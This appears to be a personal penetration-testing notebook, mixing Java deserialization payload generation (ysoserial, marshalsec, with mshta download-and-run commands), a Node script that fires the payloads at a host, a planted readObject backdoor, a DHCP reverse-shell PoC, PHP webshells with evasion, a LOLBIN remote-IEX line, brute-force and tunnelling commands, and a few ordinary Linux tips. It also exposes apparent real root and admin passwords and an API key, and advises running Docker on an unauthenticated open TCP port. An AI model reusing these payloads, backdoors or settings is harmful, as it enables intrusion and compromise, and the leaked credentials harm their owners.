java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Clojure 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Clojure.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > CommonsBeanutils1
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Groovy1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Groovy1.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Hibernate1.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate2 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Hibernate2.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar JBossInterceptors1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > JBossInterceptors1.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar JSON1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > JSON1.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar JavassistWeld1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > JavassistWeld1.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Jdk7u21.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar MozillaRhino1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > MozillaRhino1.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Myfaces1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Myfaces1.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Myfaces2 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Myfaces2.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar ROME 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > ROME.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Spring1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Spring1.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Spring2 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Spring2.bin


var net = require('net'),
	fs = require('fs'),
	oTmp = {"port": 8088,"host":"192.168.10.70",timeout:5000},
	szPath = "~/safe/top20/metasploit-framework/tmp/",
	szHd = fs.readFileSync(szPath + "post.txt").toString();

function fnSend(s)
{
	s = fs.readFileSync(szPath + s);
	var client = net.createConnection(oTmp,function()
	{
		client.write(szHd.replace(/277/gmi, s.length + 1));
		client.write(s);
		// client.end();
	});
}	


var a = "BeanShell1.bin,CommonsCollections6.bin,Jython1.bin,C3P0.bin,Groovy1.bin,MozillaRhino1.bin,Clojure.bin,Hibernate1.bin,Myfaces1.bin,CommonsCollections1.bin,Hibernate2.bin,Myfaces2.bin,CommonsCollections2.bin,JBossInterceptors1.bin,ROME.bin,CommonsCollections3.bin,JSON1.bin,Spring1.bin,CommonsCollections4.bin,JavassistWeld1.bin,Spring2.bin,CommonsCollections5.bin,Jdk7u21.bin".split(/[,]/);

for(var k in a)
{
	console.log("start payload: " + a[k]);
	fnSend(a[k]);
}

node  myapp/sd.js

```

# marshalsec反序列化
https://github.com/mbechler/marshalsec
## Marshaller
```
BlazeDSAMF(0|3|X)
Hessian|Burlap
Castor
Jackson
Java
JsonIO
JYAML
Kryo
KryoAltStrategy
Red5AMF(0|3)
SnakeYAML
XStream
YAMLBeans
```
Run a JNDI reference redirector service pointing to that codebase - two implementations are included: marshalsec.jndi.LDAPRefServer and RMIRefServer.
```
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]
```
## GadgetType
```
    UnicastRef
    UnicastRemoteObject
    Groovy
    SpringPropertyPathFactory
    SpringPartiallyComparableAdvisorHolder
    SpringAbstractBeanFactoryPointcutAdvisor
    Rome
    XBean
    Resin
    CommonsConfiguration
    LazySearchEnumeration
    BindingEnumeration
    ServiceLoader
    ImageIO
    CommonsBeanutils
    C3P0WrapperConnPool
    C3P0RefDataSource
    JdbcRowSet
    ScriptEngine
    Templates
    ResourceGadget
```
## 命令
```
java -cp /Users/`whoami`/safe/myhktools/jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.JsonIO  Groovy 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > marshalsec_JsonIO_Groovy.txt

java -cp /Users/`whoami`/safe/myhktools/jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF0  SpringPropertyPathFactory 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > marshalsec_BlazeDSAMF0_SpringPropertyPathFactory.bin

java -cp /Users/`whoami`/safe/myhktools/jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF3
Picked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF-8
No gadget type specified, available are [UnicastRef, SpringPropertyPathFactory, C3P0WrapperConnPool]

java -cp /Users/`whoami`/safe/myhktools/jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF3  SpringPropertyPathFactory 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > marshalsec_BlazeDSAMF3_SpringPropertyPathFactory.bin

```

## 后渗透：http隧道

```
git clone https://github.com/hktalent/myhktools
cd myhktools
1、植入x.jsp
https://github.com/hktalent/myhktools/py/x.jsp
2、建立http隧道反向代理
python py/reGeorgSocksProxy.py -p 8081 -u  http://xx.xxx.com:8070/x1/x.jsp

3、Proxifier设置代理127.0.0.1，8081
还可以设置特定网段使用该代理
那么，恭喜你，现在你可以进入内网了
```

### linux 经典防火墙配置

```
# 清楚所有的规则
iptables --flush
# 禁止ping
iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP
# tcp ip协议攻击防御, 例如 慢速攻击防御
iptables -A INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -m state --state NEW -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
iptables -t filter -A INPUT -m state --state INVALID -j DROP
iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,FIN FIN -j DROP
iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,PSH PSH -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags ACK,URG URG -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags FIN,RST FIN,RST -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags ALL SYN,FIN -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags ALL URG,PSH,FIN -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags ALL FIN -j DROP
iptables -t filter -A INPUT -p tcp --tcp-flags ALL URG,PSH,SYN,FIN -j DROP
# 80端口设置相同ip最大并发5
iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 5 -j REJECT --reject-with tcp-reset
# 禁止任何445端口的链接、进出，似乎各种勒索病毒外联用这个端口
sudo iptables -A INPUT -p tcp --dport 445 -j DROP
sudo iptables -A OUTPUT -p tcp --dport 445 -j DROP
# 查看当前的拦截情况
iptables  -L -n -v
# 带行号，方便基于行号进行删除
iptables -nL --line-number


```
# 一行java代码实现超级逼格后门
```
1、java、或jsp中添加
注意：以下代码没有任何能力、道德问题，更不是API readObject问题
new java.io.ObjectInputStream(request.getInputStream()).readObject();
或者，柔性、可用空间、限制更少、成功率高的方式
new java.io.ObjectInputStream(request.getParameter('xxx')).readObject();
或者启用压缩功能，当然，这增加了该漏洞利用的难度...
new java.io.ObjectInputStream(new java.util.zip.GZIPInputStream(request.getParameter('xxx'))).readObject();

new java.io.ObjectInputStream(new java.util.zip.DeflaterInputStream(request.getInputStream())).readObject();

2、将【低于commons-collections-3.2.2.jar】版本的放入工程、加载并一起打包发布，或者jre的默认加载目录中
别管他用没有用，神一样的后门就实现了
如果中间件是root启动，那么，恭喜你，你已经拥有了这台服务器的超级控制权限了

3、这个故事告诉大家：没有用任何api的jar需要删除，或者升级到安全版本
否则心跳加速、血压升高的故事会跌宕起伏...
```

# 一个简单的C语言木马
注意：这是没有任何恶意代码的，target.c( https://github.com/0x00pf/0x00sec_code)


# 各种注入攻击
```
https://github.com/swisskyrepo/PayloadsAllTheThings
```

# http隧道
[reGeorg]
[reGeorg]:https://github.com/sensepost/reGeorg

# 行重复统计、并倒序输出
```
awk '{name[$1]++} END{for (each in name){print each "[" name[each] "]"}}' regions.txt | sort -t '[' -n -k 2 -r

cat regions.txt
good
good
good
xxx
xx
xxx

```

# 开启arp欺骗

```
echo ${rtpswd} | sudo -S ettercap -i en0 -TqM ARP:REMOTE ///
```

# meterpreter后渗透
## 后渗透常用批量脚本
https://github.com/npocmaka/batch.scripts
## 查找大于1G文件

```
1、查看有哪些磁盘
show_mount
2、进入shell
shell
3、切换到根目录
f:
cd \
forfiles /S /M * /C "cmd /c if @fsize GEQ 1073741824 echo @path"
```


## 开启wi-fi，查看自己当前ip、及经纬度
```
1、方法一
https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&key=AIzaSyDBgL8fm9bD8RLShATOLI1xKmFcZ4ieMkM&sensor=true
https://github.com/lypiut/WhereAmI
$ git clone https://github.com/victor/whereami.git whereami
$ cd whereami
$ git checkout swift
$ git submodule update --init --recursive
$ xctool install
https://github.com/BenConstable/where-am-i
npm install -g --save where-am-i
var WhereAmI = require('where-am-i')
  , help = new WhereAmI()
help.findMe(
    function (place) {
        // Located successfully!
        console.log(place.lat)
        console.log(place.lng)
        console.log(place.country.name)
    }
  , function (err) {
        // Could not locate!
    }
)
2、方法二
curl http://ipinfo.io/
```

# 常用linux命令
##  实用的 xargs 命令

```
find / -name *.conf -type f -print | xargs file
find / -name *.conf -type f -print | xargs tar cjf test.tar.gz
```
## 命令或脚本后台运行

```
nohup mysqldump -uroot -pxxxxx —all-databases > ./alldatabases.sql &（xxxxx是密码）
nohup mysqldump -uroot -pxxxxx —all-databases > ./alldatabases.sql （后面不加&符号）
```

## 找出当前系统内存使用量较高的进程

```
ps -aux | sort -rnk 4 | head -20
```

## 找出当前系统CPU使用量较高的进程

```
ps -aux | sort -rnk 3 | head -20
```

## 同时查看多个日志或数据文件

```
wget ftp://ftp.is.co.za/mirror/ftp.rpmforge.net/redhat/el6/en/x86_64/dag/RPMS/multitail-5.2.9-1.el6.rf.x86_64.rpm
yum -y localinstall multitail-5.2.9-1.el6.rf.x86_64.rpm
multitail -e "Accepted" /var/log/secure -l "ping baidu.com"
```

## 持续ping并将结果记录到日志

```
ping api.jpush.cn | awk '{ print $0”    “ strftime(“%Y-%m-%d %H:%M:%S”,systime()) } ' >> /tmp/jiguang.log &
```

## 查看tcp连接状态

```
netstat -nat |awk '{print $6}'|sort|uniq -c|sort -rn
```

## 查找80端口请求数最高的前20个IP

```
netstat -anlp|grep 80|grep tcp|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -n20
```

## ssh实现端口转发
将发往本机（192.168.1.15）的9200端口访问转发到192.168.1.19的9200端口,命令执行完后，访问192.168.1.15:9200端口则真实是访问192.168.1.19:9200端口
```
ssh -p 22 -C -f -N -g -L 9200:192.168.1.19:9200 ihavecar@192.168.1.19
```

## 查找jsp中出现的关键字

```
grep -r -i --include \*.jsp --include \*.js 'JSESSIONID' .
grep: command
-r: recursively
-i: ignore-case
--include: all *.txt: text files (escape with \ just in case you have a directory with asterisks in the filenames)
'searchterm': What to search
./: Start at current directory.

find . -name '*.js' -o -name '*.jsp' -exec grep "JSESSIONID" {} \; -print
find . -name "*.js" | xargs grep -i "JSESSIONID"
```

# CVE-2018-1111 tweetable DHCP欺骗远程反弹shell PoC :) 

```
hacker server:
nc -l -p 1337 -v

in kali,start dhcp server:
killall dnsmasq
dnsmasq --interface=eth0 --bind-interfaces \
--except-interface=lo --dhcp-range=10.1.1.1,10.1.1.10,1h \
--conf-file=/dev/null --dhcp-option=6,100.100.1.1 \
--dhcp-option=3,100.100.1.1 \
--dhcp-option="252,x'&nc -e /bin/bash 10.1.1.1 1337 #" \
--log-queries --log-facility=/var/log/dnsmasq-server.log
or:

dnsmasq --interface=eth0 --bind-interfaces \
--except-interface=lo --dhcp-range=10.1.1.1,10.1.1.10,1h \
--conf-file=/dev/null --dhcp-option=6,100.100.1.1 \
--dhcp-option=3,100.100.1.1 \
--dhcp-option="252,yarrak'&nc -e /bin/bash 10.1.1.1 1337 #" \
--log-queries --log-facility=/var/log/dnsmasq-server.log
```


# LKM Linux rootkit
可怕的工具，也是学习防御、反rootkit的途径，就是掌握他
```
https://github.com/f0rb1dd3n/Reptile
```

# 端口转发实战

```
1、建立不允许登录的用户，固定ip的服务器65上建立不允许shell的用户
a、建立用户
adduser poser --disabled-login --no-create-home --shell=/bin/false
b、修改密码
passwd poser
.***xxx#
2、kali上运行映射22到外部固定ip主机，确保随时、有固定ip可连接
ssh -N -R -f localhost:3322:172.17.1.2:22 poser@23.105.209.65 -p 29156

如果在其他机器上运行，将172.17.1.2和22端口修改，例如：
192.168.10.115:8081 ，这可以将本地网络中其他主机的服务转到远程服务器上的3322端口
3、kaili ssh配置调整
a、vi /etc/ssh/sshd_config
GatewayPorts yes 
AllowTcpForwarding yes
# TCPKeepAlive no 
# ClientAliveInterval 30
# ClientAliveCountMax 100
b、重启ssh
/etc/init.d/ssh restart
service sshd restart
4、kali上的服务转到本机，输入的是kali的root密码
将openvas 9392转到本机
ssh -L 8999:172.17.1.2:9392 root@23.105.209.65 -p 3322

公司kali服务器root密码172.17.1.2
K';&&&%^&jl_


https://127.0.0.1:8999/login/login.html
openvas
http://172.17.1.2
admin/xtmt2018
```

# jar安全溯源工具更新库

```
sudo proxychains4 -f ~/pc.conf dependency-check  --updateonly
cd /usr/local/Cellar/dependency-check/3.0.1/libexec/data/;
/usr/local/Cellar/dependency-check/3.0.1/libexec/data/mycp;ls -la;ls -la /Volumes/mtx_hktalent/bak/
295436288 Dec 27 10:32 dc.h2.db
which dependency-check 
/usr/local/bin/dependency-check
```

# java渗透，安全审计点滴
## 查找java进程
```
lsof -i -P | grep java | grep LISTEN
```
## 找出没有使用SafeGene的java进程、jvm
```
ps -ef | grep java | grep -v SafeGene.jar
```
## 查找可能存在远程攻击漏洞的进程
```
ps -ef | grep jmxremote
-Dcom.sun.management.jmxremote.port=9999
-Dcom.sun.management.jmxremote.authenticate=false
-Dcom.sun.management.jmxremote.ssl=false
```
注意：
oracle的虚拟机会判断,如果你带上了这些参数,那么会在内部调用sun.management.Agent.premain
属于Java SE的instrumentation技术.
## 查找root启动的java进程
```
ps -ef -U root | grep java
```
## 查找动态sql
```
find . -type f -name "*.xml" | xargs grep -n -E '\$[^\$]+\$'
find . -type f -name "*.class" | xargs grep -n -E 'selsql'
```
## 查找使用了javaagent技术的进程
```
ps -ef | grep "\-javaagent"
```

## 查看ip区域、ip经纬度
```
nmap -n --top-ports 1  --script ip-geolocation-geoplugin 123.125.114.144
curl http://ipinfo.io/123.125.114.144
curl ipinfo.io/123.125.114.144
{
  "ip": "123.125.114.144",
  "hostname": "No Hostname",
  "city": "Beijing",
  "region": "Beijing",
  "country": "CN",
  "loc": "39.9289,116.3883",
  "org": "AS4808 China Unicom Beijing Province Network"
geoiplookup -d /opt/local/share/GeoIP -v -i -l  123.125.114.144
nmap -n --top-ports 1 --script ip-geolocation-maxmind --script-args ip-geolocation.maxmind_db=/opt/local/share/GeoIP/GeoLiteCity-Blocks.csv 123.125.114.144
```

## 发现抓包模式的机器
```
nmap -sV --script=sniffer-detect 192.168.24.10
Host script results:
|_ sniffer-detect: Likely in promiscuous mode (tests: "11111111")
```
## 用nc进行文件传输
#### 在客户端使用
```
nc -nv target_host target_port < file.txt
```
#### 在服务器端使用
```
nc -l port > file.txt
```


# 分享outline
outline服务端基于docker真的时好思路，100M的系统，很小，不过这个东西我们只能把信任寄托Ta的良心/::D，笔记分享大家：
## 安装outline server
```
bash -c "$(wget -qO- https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh)"
```

## 遇到问题
```
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
```
### 解决
```
vi /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375
vi /etc/init.d/docker
DOCKER_OPTS="-H tcp://0.0.0.0:2375"
```
### 启动
```
/usr/bin/dockerd
```
#### 发现
```
/var/lib/docker/overlay2/7fdc575a46535e6aefc31f84df39478b165e3d86c91d39654dee25755145f686/diff/root/shadowbox/app/server/main.js
/var/lib/docker/overlay2/271755c5551f2a41681584c0259333d1f2e36f37cbdcd3a390a853b5a6c8ef2e/merged/root/shadowbox/app/server/main.js
/var/lib/docker/overlay2/271755c5551f2a41681584c0259333d1f2e36f37cbdcd3a390a853b5a6c8ef2e/merged/usr/local/lib/node_modules/npm/node_modules/libnpx/node_modules/dotenv/lib/main.js
/var/lib/docker/overlay2/271755c5551f2a41681584c0259333d1f2e36f37cbdcd3a390a853b5a6c8ef2e/merged/usr/local/lib/node_modules/npm/node_modules/qrcode-terminal/lib/main.js
/var/lib/docker/overlay2/f4ece2df0aae726c93876344135f1bb39d6442508e91ac224c2906eca4292b78/diff/usr/local/lib/node_modules/npm/node_modules/libnpx/node_modules/dotenv/lib/main.js
/var/lib/docker/overlay2/f4ece2df0aae726c93876344135f1bb39d6442508e91ac224c2906eca4292b78/diff/usr/local/lib/node_modules/npm/node_modules/qrcode-terminal/lib/main.js
```
神奇的js一直运行中
## 似乎需要node的支持(我的执行步骤如下)

```
wget https://nodejs.org/dist/v8.11.2/node-v8.11.2-linux-x64.tar.xz
unxz node-v8.11.2-linux-x64.tar.xz 
tar -xvf node-v8.11.2-linux-x64.tar 
mv node-v8.11.2-linux-x64 /usr/local/
cd  /usr/local/
mv node-v8.11.2-linux-x64 node
ln -s /usr/local/node/bin/node /usr/local/bin/node
ln -s /usr/local/node/bin/npm /usr/local/bin/npm
```


# 网络流量监控
```
流模式视频查看扫描进度
sudo nmap -v 192.168.1.0/24 | python py2gource.py -t nmap | tee parsed_nmap | gource --realtime --log-format custom - -1440x900 --bloom-intensity 0.3 -e 0.2 -i 120 --title "Nmap of 192.168.1.0/24"
```

vi tcpdump2gource.awk

```
#!/usr/bin/awk -f
# Convert `tcpdump -ttnql` output into gource custom format
{
  timestamp=$1
  sip=$2;
  proto=$5;
  dip=substr($4, 1,length($4)-1);
  direction=$3;
  type="";
  match(dip, /[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/)
  dport=substr(dip,RLENGTH+2);
  gsub(".[0-9]*$","",timestamp);
  gsub(".[0-9]*$","",dip);
  network=dip;
  gsub(".[0-9]*$","",network);
  gsub(".[0-9]*$","",sip);
  printf("%s|%s|A|%s/%s.%s|#FF00ff\n",timestamp,sip,dip,dport,proto);
  # fflush();
}
```
### shell
```
brew install gource
brew install tcpdump
rm /usr/local/var/homebrew/linked/gource/share/gource/fonts/FreeSans.ttf
ln -s /Library/Fonts/Songti.ttc /usr/local/var/homebrew/linked/gource/share/gource/fonts/FreeSans.ttf
brew install coreutils
cd /usr/local/bin
sudo ln -s ../opt/coreutils/libexec/gnubin/stdbuf stdbuf

echo >pflog.log
echo ${rtpswd} | sudo -S tcpdump -ttnql -r pflog.log 'proto \tcp' or 'proto \udp' \
| stdbuf -i0 -o0 -e0 awk -f tcpdump2gource.awk \
| gource --multi-sampling --no-vsync --title "en0 activity" --key \
  --realtime --highlight-users --highlight-dirs --user-friction 0.2 \
  --user-scale 0.8 --log-format custom --disable-auto-rotate -i 0 -
```

# 反序列化漏洞
```
https://github.com/joaomatosf/jexboss
https://github.com/Coalfire-Research/java-deserialization-exploits
https://github.com/pedrib/PoC
https://github.com/vulhub/vulhub
```

# Vulhub是一个面向大众的开源漏洞靶场
Vulhub - Some Docker-Compose files for vulnerabilities environment

Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。

在ubuntu16.04下安装docker/docker-compose:
https://github.com/vulhub/vulhub


# pentest_compilation
Compilation of commands, tips and scripts that helped me throughout Vulnhub, Hackthebox, OSCP and real scenarios
https://github.com/adon90/pentest_compilation

https://github.com/Arno0x/WebDavDelivery.git

<a name="enumeration"></a><h2> Enumeration </h2>

<a name="genumeration"></a><h3>Generic Enumeration</h3>

- port fullscan

- UDP scan


<a name="httpenumeration"></a><h3> HTTP Enumeration</h3>

- dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old

- banner inspection

- review source code

- bruteforce with cewl-based dictionary

- searchsploit look at versions properly

- test all the paths with the exploits, mangle it

- nmap --script vuln

- nmap --script safe (ssl-cert, virtual hosts)

- always incercept with Burp

- nikto -h

- LFI, RFI, SQL, RCE, XXE, SSRF injections

- PUT method all directories

- Change POST body encoding with Burp

- Bruteforce parameter names

- dirsearch with cookie once authenticated

- download vulnerable application from exploit-db and examine it

<a name="sshenumeration"></a><h3>SSH Enumeration</h3>

- shellshock

- bruteforce

- user_enum

- Debian OpenSSL Predictable PRNG

<a name="smbenumeration"></a><h3>SMB Enumeration</h3>

- nmap --script vuln

- nmap --script smb*

- nmap --script smb-enum-shares,smb-ls

- enum4linux

<a name="snmpenumeration"><h3> SNMP Enumeration</h3>

- snmpcheck

- snmpenum

<a name="explotation"></a><h2> Explotation </h2>

<a name="bof"></a><h3> BOF exploit-based </h3>

- change shellcode

- make sure all badchars are removed

- read the exploit properly in case this makes changes in the shellcode

- capture traffic with wireshark making sure the entire shellcode is transmited

- run the exploit several times

- make sure the JMP ESP matches OS and language


<a name="weakcreds"></a><h3> Weak Credentials </h3>


<a name="httpbrute"></a><b> HTTP Brute Force </b>

- wfuzz POST

```wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php```

- hydra POST

```hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20```

- wfuzz NTLM

```wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api```

- wfuzz Basic Auth through Proxy

```wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/ActivosProduban/names.txt -z file,/root/Documents/Audits/ActivosProduban/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/```


<a name="passcrack"></a><b> Password Cracking </b>

- zip

`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip `

- /etc/shadow

<pre>
unshadow passwd shadow > passwords
john --wordlist=/usr/share/wordlists/rockyou.txt passwords
</pre>

- keepass 

<pre>
keepass2john /root/Desktop/NewDatabase.kdb > file
john -incremental:alpha -format=keepass file
</pre>


<a name="rce"></a><h2> RCE </h2>

<a name="phprce"></a><h3>PHP RCE</h3>

test: 

```<?php phpinfo(); ?>```

simple shell: 

```<?php system($_GET["c"]); ?>```

```<?php `$_GET["c"]`; ?>```

file upload:

```<?php file_put_contents('/var/www/html/uploads/test.php', '<?php system($_GET["c"]);?>'); ?>```

file upload evasion:  rot13 + urlencode

```<?php $payload="%3C%3Fcuc%20flfgrz%28%24_TRG%5Bp%5D%29%3B%3F%3E"; file_put_contents('/var/www/html/uploads/test8.php', str_rot13(urldecode($payload))); ?>```


<a name="rcewebshell"></a><h3>RCE via webshell</h3>

- All pentest monkey reverse shells: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

- msfvenom x86/linux/shell_reverse_tcp -f elf

- Metasploit `web_delivery` module

- which wget | nc <ip> <port>
 
<a name="rcewmic"></a><h3>RCE via WMIC</h3>

Powershell without powershell:

Generate payload with web_delivery

![powershellless1](https://user-images.githubusercontent.com/7115563/40374533-8da00e10-5de9-11e8-888e-3b1eaccb28b0.png)

Encode Payload

![powershellless2](https://user-images.githubusercontent.com/7115563/40374540-908e0ca8-5de9-11e8-9002-5f03193b10a5.png)

Include payload in xsl file

![powershellless3](https://user-images.githubusercontent.com/7115563/40374546-92dcda84-5de9-11e8-99c8-9066ae129644.png)

<pre>wmic process get brief /format:"https://raw.githubusercontent.com/adon90/pentest_compilation/master/nops.xsl"</pre>

![powershellless4](https://user-images.githubusercontent.com/7115563/40375266-73770028-5deb-11e8-92da-952692727bec.png)

<a name="lolbins"></a><h3>LOLBINS</h3>

<pre>SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://192.168.48.129:8000/reverse.ps1') | IEX"</pre>

![lolbin1](https://user-images.githubusercontent.com/7115563/40776727-ee904d00-64cb-11e8-8921-407581b13edf.png)

<a name="privesc"></a><h2> Privilege Escalation</h2>


<a name="linux"></a><h3> Linux Privilege Escalation </h3>

- sudo -l
- Kernel Exploits
- OS Exploits
- Password reuse (mysql, .bash_history, 000-default.conf...)
- Known binaries with suid flag and interactive (nmap)
- Custom binaries with suid flag either using other binaries or with command execution
- Writable files owned by root that get executed (cronjobs)
- MySQL as root
- Vulnerable services (chkrootkit, logrotate)
- Writable /etc/passwd
- Readable .bash_history
- SSH private key
- Listening ports on localhost
- /etc/fstab
- /etc/exports
- /var/mail
- Process as other user (root) executing something you have permissions to modify
- SSH public key + Predictable PRNG
- apt update hooking (Pre-Invoke)

<a name="windows"></a><h3> Windows Privilege Escalation </h3>

- Kernel Exploits
- OS Exploits
- Pass The Hash
- Password reuse
- DLL hijacking (Path)
- Vulnerable services
- Writable services binaries path
- Unquoted services
- Listening ports on localhost
- Registry keys


<a name="kernel"></a><h3> Kernel Exploits </h3>

Linux: https://github.com/lucyoa/kernel-exploits

Windows: https://github.com/abatchy17/WindowsExploits



<a name="tunneling"></a><h2>Tunneling</h2>

<a name="sshovertcp"></a><h3>SSH over HTTP (Squid)</h3>

<b> socat </b>

<pre>socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128

ssh john@127.0.0.1 -p 9999</pre>


<b>proxytunnel </b>

<pre>proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555

ssh john@127.0.0.1 -p 5555</pre>

<b>proxychains </b>

<pre>http 192.168.1.41 3128

proxychains ssh john@127.0.0.1</pre>

![proxychains](https://user-images.githubusercontent.com/7115563/33822522-1e15dbee-de58-11e7-9953-3da8ff684cfc.png)


<b>corkscrew </b>

<pre>ssh john@192.168.1.41 -t /bin/sh</pre>

![cork](https://user-images.githubusercontent.com/7115563/33822672-b92a51f0-de58-11e7-9936-06056b7903b8.png)


<a name="tcpoverhttp"></a><h3> TCP over HTTP </h3>

For this technique, it is necessary to be able to upload a file to a webserver.

<a name="regeorg"><b> 1. reGeorg </b>
  
  File upload to the server correct
  
  ![regeorge2](https://user-images.githubusercontent.com/7115563/33883424-028c9f0e-df3c-11e7-9559-b35667ae76db.png)
  
  Tunnel creation
  
  `python reGeorgSocksProxy.py -p 5555 -u "http://<ip>/admin/uploads/reGeorg.jsp"`
  
  Proxychains config
  
  ![regeorge1](https://user-images.githubusercontent.com/7115563/33883419-fcc15416-df3b-11e7-89a9-499ffc1de9cf.png)
  
  <pre>
proxychains nmap -F -sT 127.0.0.1
proxychains mysql -u root -p -h 127.0.0.1
proxychains ssh localhost
</pre>

![regeorge3](https://user-images.githubusercontent.com/7115563/33883422-017021fe-df3c-11e7-8f99-f02de5084c02.png)

Reference: https://sensepost.com/discover/tools/reGeorg/

 <a name="abptts"><b> 2. ABBTTS </b>
  
Upload File

![abbtts5](https://user-images.githubusercontent.com/7115563/33883774-6d249ffa-df3d-11e7-9f3f-68bf1e70465f.png)

Config proxychains and create the tunnel

```python abpttsclient.py -c tomcat_walkthrough/config.txt -u http://192.168.1.128/abptts.jsp -f 127.0.0.1:22222/127.0.0.1:22```

Usage

```ssh -p 22222 user@127.0.0.1```

![abbtts7](https://user-images.githubusercontent.com/7115563/33883891-dc2f3c70-df3d-11e7-84e9-ebd9eab9ebee.png)

Reference: https://github.com/nccgroup/ABPTTS



<a name="poor"></a><h3> Man's Poor VPN </h3>

Traffic forward over SSH without needing to ```ssh -D <port>```

<pre>sshuttle -vr user@192.168.207.57 180.46.0.0/16</pre>

![shuttle2](https://user-images.githubusercontent.com/7115563/34785498-a0b5c8c0-f631-11e7-8f3d-75e0ade96275.png)

Proof:

